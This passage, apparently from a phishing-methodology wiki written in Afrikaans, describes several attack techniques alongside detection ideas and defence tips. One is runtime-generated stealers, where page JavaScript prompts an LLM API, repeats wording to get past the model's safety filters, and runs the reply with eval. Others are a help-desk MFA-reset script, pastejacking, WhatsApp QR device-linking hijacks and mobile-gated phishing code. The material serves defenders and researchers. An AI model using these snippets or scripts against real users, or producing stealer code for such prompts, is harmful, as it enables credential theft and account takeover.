Attackers kan skynbaar skadelose HTML stuur en die stealer **tydens runtime genereer** deur 'n **trusted LLM API** vir JavaScript te vra en dit dan in die blaaier uit te voer (bv. `eval` of dinamiese `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** enkodeer exfil-URL's/Base64-stringe in die prompt; herhaal die bewoording om safety filters te omseil en hallucinations te verminder.
2. **Client-side API call:** wanneer dit laai, roep JS 'n publieke LLM (Gemini/DeepSeek/etc.) of 'n CDN-proxy aan; slegs die prompt/API-call is in statiese HTML teenwoordig.
3. **Assemble & exec:** konkateniseer die response en voer dit uit (polimorfies per besoek):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generated code verpersoonlik die lokmiddel (bv. LogoKit token parsing) en plaas creds na die prompt-hidden endpoint.

**Evasion traits**
- Verkeer tref bekende LLM-domains of betroubare CDN-proxies; soms via WebSockets na ’n backend.
- Geen statiese payload nie; kwaadwillige JS bestaan slegs ná rendering.
- Nie-deterministiese generasies produseer **unieke stealers per sessie**.

**Detection ideas**
- Laat sandboxes met JS geaktiveer loop; merk **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Soek front-end POSTs na LLM APIs wat onmiddellik gevolg word deur `eval`/`Function` op teruggestuurde teks.
- Waarsku oor ongoedgekeurde LLM-domains in kliëntverkeer, gevolg deur credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Benewens klassieke push-bombing, **forceer operateurs eenvoudig ’n nuwe MFA-registration** tydens die help-desk-oproep, wat die gebruiker se bestaande token ongeldig maak. Enige daaropvolgende login-prompt lyk vir die slagoffer legitiem.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitor vir AzureAD/AWS/Okta-gebeure waar **`deleteMFA` + `addMFA`** **binne minute vanaf dieselfde IP** plaasvind.



## Clipboard Hijacking / Pastejacking

Aanvallers kan kwaadwillige opdragte stilweg vanaf ’n gekompromitteerde of typosquatted-webblad na die slagoffer se knipbord kopieer en die gebruiker dan mislei om dit binne **Win + R**, **Win + X** of ’n terminale venster te plak, waardeur arbitrêre kode uitgevoer word sonder enige aflaai of aanhegsel.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* ’n Lokbladsy (bv. ’n vals ministerie-/CERT-“channel”) vertoon ’n WhatsApp Web/Desktop-QR-kode en gee die slagoffer opdrag om dit te skandeer, waardeur die aanvaller stilweg as ’n **linked device** bygevoeg word.<sup>[[12]](#references)</sup>
* Die aanvaller kry onmiddellik sigbaarheid van kletse en kontakte totdat die sessie verwyder word. Slagoffers kan later ’n “new device linked”-kennisgewing sien; verdedigers kan jag na onverwagte device-link-gebeure kort ná besoeke aan onbetroubare QR-bladsye.

### Mobile‑gated phishing to evade crawlers/sandboxes
Operateurs beperk hul phishing-vloeie toenemend agter ’n eenvoudige toestelkontrole sodat desktop-crawlers nooit die finale bladsye bereik nie. ’n Algemene patroon is ’n klein script wat toets of die DOM aanraakvermoë het en die resultaat na ’n bedienerendpoint stuur; nie‑mobiele kliënte ontvang HTTP 500 (of ’n leë bladsy), terwyl mobiele gebruikers die volledige vloei bedien word.<sup>[[7]](#references)</sup>

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js`-logika (vereenvoudig):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Bedienergedrag wat dikwels waargeneem word:
- Stel 'n sessiekoekie tydens die eerste laai.
- Aanvaar `POST /detect {"is_mobile":true|false}`.
- Lewer 500 (of 'n plekhouer) aan daaropvolgende GET-versoeke wanneer `is_mobile=false`; bedien phishing slegs indien `true`.

Heuristieke vir opsporing en identifisering:
- urlscan-navraag: `filename:"detect_device.js" AND page.status:500`
- Web-telemetrie: volgorde van `GET /static/detect_device.js` → `POST /detect` → HTTP 500 vir nie-mobile; wettige mobile slagofferpaadjies lewer 200 met daaropvolgende HTML/JS.
- Blokkeer of ondersoek bladsye noukeurig wat inhoud uitsluitlik op `ontouchstart` of soortgelyke toestelkontroles baseer.

Verdedigingswenke:
- Voer crawlers uit met mobile-agtige fingerprints en JS geaktiveer om beperkte inhoud bloot te lê.
- Stel waarskuwings op vir verdagte 500-reaksies ná `POST /detect` op nuut geregistreerde domeine.

## References

- [1] [Generering van domeinvariasies wat in phishing gebruik word (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Phishing vind: Gereedskap en tegnieke (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Steel geloofsbriewe en omseil 2FA met noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Steel sessies en omseil 2FA met EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Hoe om DKIM met Postfix op Debian Wheezy te installeer en op te stel (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [2025 Unit 42-verslag oor wêreldwye insidentreaksie – uitgawe oor sosiale manipulasie](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Stil Smishing – mobile-beheerde phishing-infrastruktuur en heuristieke (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Die volgende grens van runtime-samestellingsaanvalle: Gebruik van LLM's om phishing-JavaScript intyds te genereer](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Identiteitsnabootsing, klik-kaping en TDS: Binne 'n malwareverspreiding-ekosisteem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting van Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Kaping van verkeer na Microsoft se windows.com met bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Liefde? Eintlik: Valse dating-app as lokmiddel in geteikende spyware-veldtog in Pakistan gebruik](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoCs en voorbeelde](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
